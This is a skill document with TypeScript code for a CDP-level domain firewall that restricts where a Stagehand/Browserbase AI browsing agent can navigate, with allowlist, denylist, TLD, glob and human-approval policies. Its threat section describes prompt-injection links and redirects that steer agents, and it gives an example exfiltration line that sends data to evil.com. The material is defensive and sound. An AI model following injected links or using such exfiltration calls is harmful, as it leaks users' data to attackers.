---
name: domain-firewall
description: Implement CDP-based domain allowlist security for Stagehand/Browserbase browser sessions. Use when the user wants to restrict which domains an AI agent can navigate to, block malicious links, prevent prompt injection redirects, or add navigation security to browser automation.
license: MIT
---

# Domain Firewall — CDP Navigation Security for Stagehand

Intercept every browser navigation at the Chrome DevTools Protocol level and gate it by composable policies. Non-allowed domains are blocked or frozen mid-request for human approval.

## Why This Matters

AI agents browsing on behalf of users are vulnerable to navigation-based attacks:

- **Prompt injection links**: A page contains a malicious link embedded in content. The agent's `act()` or `extract()` may follow it.
- **Open redirects**: A trusted domain redirects to an attacker-controlled site via `Location` header or `<meta http-equiv="refresh">`.
- **JavaScript-triggered navigation**: A script calls `window.location = "https://evil.com/exfil?data=..."` after the page loads.
- **Data exfiltration**: An attacker-controlled page reads cookies, localStorage, or page content and sends it to their server.

Application-level URL validation (checking the URL before calling `goto()`) only catches explicit navigations. It misses redirects, meta refreshes, link clicks, and JS-initiated navigations entirely.

The domain firewall operates at the **protocol level** — below the browser engine. Every network request, regardless of how it was triggered, passes through the gate.

## How It Works

1. After `stagehand.init()`, call `page.sendCDP("Fetch.enable")` to intercept all requests
2. `page.getSessionForFrame(page.mainFrameId())` gives you the CDP session with `.on()` for events
3. `session.on("Fetch.requestPaused")` fires for every request before the browser executes it
4. Filter to `Document` resource type (page navigations only — images, CSS, JS pass through)
5. Run the navigation through the **policy chain** — each policy returns `"allow"`, `"deny"`, or `"abstain"`
6. First non-`"abstain"` verdict wins. If all policies abstain, `defaultVerdict` applies (default: `"deny"`)

## Policy System

The firewall uses composable policies evaluated in order. Each policy independently decides whether to allow, deny, or abstain (defer to the next policy).

### Types

```typescript
type Verdict = "allow" | "deny" | "abstain";

interface NavigationRequest {
  domain: string;  // normalized (no www, lowercase)
  url: string;     // full URL
}

interface FirewallPolicy {
  name: string;
  evaluate(req: NavigationRequest): Verdict | Promise<Verdict>;
}

interface FirewallConfig {
  policies: FirewallPolicy[];
  defaultVerdict?: "allow" | "deny";  // default: "deny"
  auditLog?: AuditEntry[];
}

interface AuditEntry {
  time: string;
  domain: string;
  url: string;
  action: "ALLOWED" | "BLOCKED";
  decidedBy: string;  // which policy made the decision, or "default"
}
```

### Built-in Policies

Five factory functions, each returning a `FirewallPolicy`:

#### `allowlist(domains)` — static domain allowlist

```typescript
function allowlist(domains: string[]): FirewallPolicy
```

Returns `"allow"` if the domain matches, `"abstain"` otherwise.

```typescript
allowlist(["wikipedia.org", "en.wikipedia.org", "github.com"])
```

#### `denylist(domains)` — static domain denylist

```typescript
function denylist(domains: string[]): FirewallPolicy
```

Returns `"deny"` if the domain matches, `"abstain"` otherwise.

```typescript
denylist(["evil.com", "phishing-site.com", "malware.download"])
```

#### `pattern(globs, verdict)` — glob matching on domain

```typescript
function pattern(globs: string[], verdict: "allow" | "deny"): FirewallPolicy
```

Matches domain against glob patterns (`*` = any characters). Returns the given verdict on match, `"abstain"` otherwise.

```typescript
pattern(["*.github.com", "*.githubusercontent.com"], "allow")
pattern(["*.ru", "*.cn"], "deny")
```

#### `tld(rules)` — TLD-based rules

```typescript
function tld(rules: Record<string, "allow" | "deny">): FirewallPolicy
```

Checks the domain's TLD against the rules map. Returns the mapped verdict, or `"abstain"` if the TLD isn't in the map.

```typescript
tld({ ".org": "allow", ".edu": "allow", ".gov": "allow", ".ru": "deny" })
```

#### `interactive(handler, opts?)` — human-in-the-loop with timeout

```typescript
function interactive(
  handler: (req: NavigationRequest) => Promise<"allow" | "deny">,
  opts?: { timeoutMs?: number; onTimeout?: "allow" | "deny"; remember?: boolean },
): FirewallPolicy
```

Calls the async handler and waits for a human decision. Built-in timeout defaults to 30 seconds, auto-denying on timeout. **Remembers decisions by default** — once you approve or deny a domain, you won't be asked again for the rest of the session. Set `remember: false` to prompt every time.

```typescript
import * as readline from "readline/promises";

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

interactive(
  async (req) => {
    console.log(`\n  Agent wants to visit: ${req.domain} (${req.url})`);
    const answer = await rl.question("  Allow? (y/n): ");
    return answer.trim().toLowerCase().startsWith("y") ? "allow" : "deny";
  },
  { timeoutMs: 60000, onTimeout: "deny" },  // remember: true is the default
)
```

### Composing Policies

Policies evaluate in array order. First non-`"abstain"` verdict wins.

```typescript
const config: FirewallConfig = {
  policies: [
    denylist(["evil.com", "phishing.com"]),         // 1. deny known bad domains
    allowlist(["wikipedia.org", "github.com"]),      // 2. allow known good domains
    tld({ ".org": "allow", ".edu": "allow" }),       // 3. allow trusted TLDs
    pattern(["*.github.com"], "allow"),              // 4. allow GitHub subdomains
    // 5. everything else falls through to defaultVerdict
  ],
  defaultVerdict: "deny",
  auditLog: [],
};
```

**Evaluation for `evil.com`**: denylist → `"deny"` (stops here)
**Evaluation for `github.com`**: denylist → `"abstain"` → allowlist → `"allow"` (stops here)
**Evaluation for `mozilla.org`**: denylist → `"abstain"` → allowlist → `"abstain"` → tld → `"allow"` (`.org` rule)
**Evaluation for `example.com`**: all abstain → `defaultVerdict` → `"deny"`

## Prerequisites

- Stagehand v3 (`@browserbasehq/stagehand ^3.0.0`)
- Environment variables: `BROWSERBASE_API_KEY`, `BROWSERBASE_PROJECT_ID`
- Optional: `OPENAI_API_KEY` or `MODEL_API_KEY` (only if using Stagehand AI features like `act()`)

## Core Implementation

Copy this into your project. The file exports all types, built-in policies, and `installDomainFirewall`.

### Helpers

```typescript
function normalizeDomain(hostname: string): string {
  return hostname.replace(/^www\./, "").toLowerCase();
}

function ts(): string {
  return new Date().toISOString().substring(11, 19);
}

function globToRegex(glob: string): RegExp {
  const escaped = glob
    .replace(/[.+^${}()|[\]\\]/g, "\\$&")
    .replace(/\*/g, ".*");
  return new RegExp(`^${escaped}$`);
}

async function evaluatePolicies(
  policies: FirewallPolicy[],
  req: NavigationRequest,
  defaultVerdict: "allow" | "deny",
): Promise<{ verdict: "allow" | "deny"; decidedBy: string }> {
  for (const policy of policies) {
    const v = await policy.evaluate(req);
    if (v !== "abstain") {
      return { verdict: v, decidedBy: policy.name };
    }
  }
  return { verdict: defaultVerdict, decidedBy: "default" };
}
```

### Built-in Policy Implementations

```typescript
export function allowlist(domains: string[]): FirewallPolicy {
  const set = new Set(domains.map((d) => normalizeDomain(d)));
  return {
    name: "allowlist",
    evaluate: (req) => (set.has(req.domain) ? "allow" : "abstain"),
  };
}

export function denylist(domains: string[]): FirewallPolicy {
  const set = new Set(domains.map((d) => normalizeDomain(d)));
  return {
    name: "denylist",
    evaluate: (req) => (set.has(req.domain) ? "deny" : "abstain"),
  };
}

export function pattern(
  globs: string[],
  verdict: "allow" | "deny",
): FirewallPolicy {
  const regexes = globs.map(globToRegex);
  return {
    name: `pattern:${verdict}`,
    evaluate: (req) =>
      regexes.some((r) => r.test(req.domain)) ? verdict : "abstain",
  };
}

export function tld(
  rules: Record<string, "allow" | "deny">,
): FirewallPolicy {
  return {
    name: "tld",
    evaluate: (req) => {
      const dot = "." + req.domain.split(".").pop();
      return rules[dot] ?? "abstain";
    },
  };
}

export function interactive(
  handler: (req: NavigationRequest) => Promise<"allow" | "deny">,
  opts?: { timeoutMs?: number; onTimeout?: "allow" | "deny"; remember?: boolean },
): FirewallPolicy {
  const timeoutMs = opts?.timeoutMs ?? 30000;
  const onTimeout = opts?.onTimeout ?? "deny";
  const remember = opts?.remember ?? true;
  const approved = new Set<string>();
  const denied = new Set<string>();
  return {
    name: "interactive",
    evaluate: async (req) => {
      if (approved.has(req.domain)) return "allow";
      if (denied.has(req.domain)) return "deny";
      const verdict = await Promise.race([
        handler(req),
        new Promise<"allow" | "deny">((resolve) =>
          setTimeout(() => resolve(onTimeout), timeoutMs),
        ),
      ]);
      if (remember) {
        if (verdict === "allow") approved.add(req.domain);
        else denied.add(req.domain);
      }
      return verdict;
    },
  };
}
```

### installDomainFirewall

```typescript
export async function installDomainFirewall(
  page: any,
  config: FirewallConfig,
): Promise<void> {
  const policies = config.policies;
  const defaultVerdict = config.defaultVerdict ?? "deny";
  const auditLog = config.auditLog;

  await page.sendCDP("Fetch.enable", {
    patterns: [{ urlPattern: "*" }],
  });

  const session = page.getSessionForFrame(page.mainFrameId());

  session.on(
    "Fetch.requestPaused",
    async (params: {
      requestId: string;
      request: { url: string };
      resourceType?: string;
    }) => {
      const url = params.request.url;

      // Pass through non-document requests (images, CSS, JS, fonts, etc.)
      const resourceType = params.resourceType || "";
      if (resourceType !== "Document" && resourceType !== "") {
        await page.sendCDP("Fetch.continueRequest", { requestId: params.requestId });
        return;
      }

      // Pass through internal pages
      if (
        url.startsWith("chrome") ||
        url.startsWith("about:") ||
        url.startsWith("data:")
      ) {
        await page.sendCDP("Fetch.continueRequest", { requestId: params.requestId });
        return;
      }

      let domain: string;
      try {
        domain = normalizeDomain(new URL(url).hostname);
      } catch {
        await page.sendCDP("Fetch.continueRequest", { requestId: params.requestId });
        return;
      }

      const req: NavigationRequest = { domain, url };
      const { verdict, decidedBy } = await evaluatePolicies(
        policies,
        req,
        defaultVerdict,
      );

      if (verdict === "allow") {
        auditLog?.push({
          time: ts(), domain, url: url.substring(0, 80),
          action: "ALLOWED", decidedBy,
        });
        await page.sendCDP("Fetch.continueRequest", { requestId: params.requestId });
      } else {
        auditLog?.push({
          time: ts(), domain, url: url.substring(0, 80),
          action: "BLOCKED", decidedBy,
        });
        await page.sendCDP("Fetch.failRequest", {
          requestId: params.requestId,
          errorReason: "BlockedByClient",
        });
      }
    },
  );
}
```

## Basic Usage

```typescript
import { Stagehand } from "@browserbasehq/stagehand";
import {
  installDomainFirewall,
  allowlist,
  denylist,
  type AuditEntry,
} from "./domain-firewall";

const stagehand = new Stagehand({ env: "BROWSERBASE" });
await stagehand.init();
const page = stagehand.context.pages()[0];

const auditLog: AuditEntry[] = [];

await installDomainFirewall(page, {
  policies: [
    denylist(["evil.com"]),
    allowlist(["wikipedia.org", "en.wikipedia.org"]),
  ],
  defaultVerdict: "deny",
  auditLog,
});

// Passes through (allowlist)
await page.goto("https://en.wikipedia.org/wiki/Web_browser");

// Blocked (default deny)
await page.goto("https://example.com").catch(() => {
  console.log("Blocked by firewall");
});

// Print audit log
for (const e of auditLog) {
  console.log(`${e.action} ${e.domain} (${e.decidedBy})`);
}

await stagehand.close();
```

## Best Practices

1. **Put denylists first** — Check known-bad domains before known-good. This ensures a domain on both lists is denied.
2. **Include subdomains explicitly in allowlists** — `wikipedia.org` and `en.wikipedia.org` are separate domains. Use `pattern(["*.wikipedia.org"], "allow")` for broad subdomain matching.
3. **Install before the first navigation** — Call `installDomainFirewall()` immediately after `stagehand.init()` and before any `page.goto()`.
4. **Add your starting URL's domain to the allowlist** — Otherwise the first `goto()` will be blocked.
5. **Log everything** — Pass an `auditLog` array and review it after the session. The `decidedBy` field tells you which policy made each decision.
6. **Set timeouts on interactive policies** — Don't hold requests indefinitely. The `interactive()` policy has built-in timeout support.
7. **Combine with Browserbase stealth/proxy** — The firewall protects the agent from navigating to bad domains. Stealth mode and proxies protect the agent from being detected by good domains.

## Troubleshooting

- **Navigation timeout after deny**: Expected. `Fetch.failRequest` causes the `page.goto()` Promise to reject with a network error. Wrap `goto()` in `.catch()`.
- **Sub-resources being blocked**: The `resourceType !== "Document"` filter should pass them through. If not, check that `Fetch.enable` patterns aren't too restrictive.
- **Firewall not catching link clicks**: Verify `Fetch.enable` was called with `patterns: [{ urlPattern: "*" }]`.
- **Session disconnected**: The CDP session from `getSessionForFrame` is tied to the frame lifecycle. If the page crashes, reinstall the firewall.
- **Policy order matters**: If a domain matches both an allowlist and a denylist, whichever policy appears first in the array wins. Put denylists before allowlists.

For detailed examples, see [EXAMPLES.md](EXAMPLES.md).
For API reference, see [REFERENCE.md](REFERENCE.md).
